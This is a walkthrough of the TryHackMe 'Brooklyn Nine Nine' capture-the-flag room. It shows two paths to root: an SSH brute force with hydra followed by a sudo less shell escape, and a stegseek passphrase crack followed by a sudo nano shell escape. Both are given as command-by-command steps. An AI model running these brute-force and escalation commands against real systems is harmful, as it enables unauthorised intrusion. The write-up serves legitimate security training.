---
title: "THM: Brooklyn Nine Nine"
date: 2025-11-23 14:00:00 +1000
categories: [TryHackMe, Easy]
tags: [linux, ssh-bruteforce, steganography, gtfobins, sudo-abuse, hydra, stegseek]
---

![Banner](/assets/Images/Brooklyn-Nine-Nine/banner.png)

Linux box with multiple paths to root. Method 1 uses SSH brute force and sudo less abuse. Method 2 leverages steganography to extract credentials and sudo nano exploitation.

## Method 1: SSH Brute Force → Misconfigured binary privs → Sudo Abuse

### Initial Enumeration
```
sudo nmap -sS -sV -T5 TARGET_IP
```

### FTP Anonymous Access
```
ftp anonymous@TARGET_IP
get note_to_jake.txt
```

**Note Contents:**

Jake's password is weak and needs to be changed. Discovered potential users: **amy** and **holt**.

---

### SSH Password Brute Force

Attempting SSH brute force against Jake:
```
hydra -l jake -P /path/to/rockyou.txt ssh://TARGET_IP -t 64 -V
```

**Success!** Jake's password cracked.

### Initial SSH Access
```
ssh jake@TARGET_IP
```

Logged in as Jake. Found first user flag in Holt's `/home` directory.

---

### Privilege Enumeration

Checked jakes sudo privs:
```
sudo -l
```

**Critical Finding:**
```
User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

Jake can run `less` with sudo without password!

---

### Privilege Escalation via Less

Verified sudo permissions:
```
sudo -l
```

Spawned root shell using `less` (GTFOBins):
```
sudo less /etc/passwd
```

While in `less`, typed `!/bin/bash` to spawn shell.

**Verification:**
```
id
```

**Output:**
```
uid=0(root) gid=0(root) groups=0(root)
```

Root access achieved!

---

### Flag Retrieval
```
find / -name root.txt
cat /root/root.txt
```

Root flag obtained.

---

## Method 2: Steganography → SSH → Nano GTFOBins

### Initial Enumeration

Same nmap scan identifies SSH and HTTP services.

### Web Enumeration & Steganography

Source code hint: *"Have you ever heard of steganography?"*

Downloaded embedded image:
```
wget http://TARGET_IP/brooklyn99.jpg
```

Checked for hidden data:
```
steghide info brooklyn99.jpg
```

**Output:** Image contains hidden data protected by passphrase.

---

### Cracking Steganography Password

Using stegseek to crack passphrase:
```
stegseek brooklyn99.jpg /path/to/rockyou.txt
```

**Output:**
```
[i] Found passphrase: "admin"
[i] Original filename: "note.txt"
[i] Extracting to "brooklyn99.jpg.out"
```

### Extracting Hidden Data
```
cat brooklyn99.jpg.out
```

**Contents:** Holt's password discovered!

---

### SSH Access as Holt
```
ssh holt@TARGET_IP
```

Successfully authenticated as Holt.

### Checking Sudo Privileges
```
sudo -l
```

**Output:**
```
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

Holt can run `nano` with sudo!

---

### Privilege Escalation via Nano

Opened nano with sudo:
```
sudo nano
```

Triggered command execution in nano:
1. Press `CTRL+R` (Read File)
2. Press `CTRL+X` (Execute Command)
3. Enter /bin/bash (Spawns bash shell with root privs)
```
/bin/bash
```

Root shell obtained!

---

### Flag Retrieval
```
find / -name root.txt
cat /root/root.txt
```

Mission complete!

---

## Notable Commands

| Command | Description |
|---------|-------------|
| `ftp anonymous@TARGET_IP` | Attempt anonymous FTP login |
| `strings imagefile.jpg` | Extract printable strings from binary file |
| `hydra -l user -P wordlist ssh://TARGET_IP -t 64` | SSH password brute force |
| `scp file user@TARGET_IP:/path` | Securely copy files to remote system |
| `sudo less /etc/passwd` then `!/bin/bash` | Spawn root shell via less GTFOBins |
| `steghide info image.jpg` | Check for steganography in image |
| `stegseek image.jpg wordlist.txt` | Crack steganography passphrase |
| `sudo nano` then CTRL+R, CTRL+X | Execute commands via nano GTFOBins |

---

## Key Takeaways

### Method 1 Insights:
- Weak passwords are easily cracked with Hydra and common wordlists
- GTFOBins - `less` can spawn shells when run with sudo privileges
- File permissions - readable user directories can leak flags

### Method 2 Insights:
- Steganography hides data in plain sight within image files
- Stegseek efficiently cracks steganography passphrases
- Password reuse - credentials found in one location work for SSH
- Text editor exploitation - `nano` with sudo allows command execution
- Reverse shells provide interactive root access when direct shells aren't available

### Universal Lessons:
- Multiple paths to root - same target, different techniques
- Enumeration depth matters - steganography requires specific tools
- GTFOBins is essential - always check for sudo binary abuse
- Method selection depends on available information and tools

---

## Attack Chain Comparison

### Method 1:
1. Anonymous FTP → Found note with username hints
2. SSH brute force → Cracked Jake's password
3. Priv enumeration → Found sudo less permissions
4. GTFOBins less exploit → Root shell

### Method 2:
1. Web enumeration → Steganography hint
2. Stegseek cracking → Extracted Holt's password
3. SSH as Holt → Sudo nano permissions
4. GTFOBins nano exploit → Root reverse shell

---

**Room:** Brooklyn Nine Nine | **Platform:** TryHackMe | **Difficulty:** Easy | **Methods:** Hydra + Less GTFOBins | Steganography + Nano GTFOBins
